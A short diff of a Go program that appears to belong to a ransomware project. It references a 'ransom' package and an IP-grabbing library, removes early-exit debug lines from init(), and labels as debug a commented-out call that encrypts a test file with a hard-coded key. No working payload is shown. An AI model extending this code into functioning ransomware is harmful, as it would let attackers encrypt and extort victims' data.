@@ -17,10 +17,6 @@ import (
 var IPData go_grab_ip.IPData
 
 func init() {
-	fmt.Println(os.Args[1])
-	os.Exit(0)
-	return
-
 	//wait until there's internet
 }
 
@@ -71,6 +67,7 @@ func main() {
 		}
 	}
 
+	//Debug stuff
 	//err := ransom.EncryptFile("test.txt", []byte("12345678912345678912345678912345"))
 	//if err != nil {
 	//	fmt.Println(err)
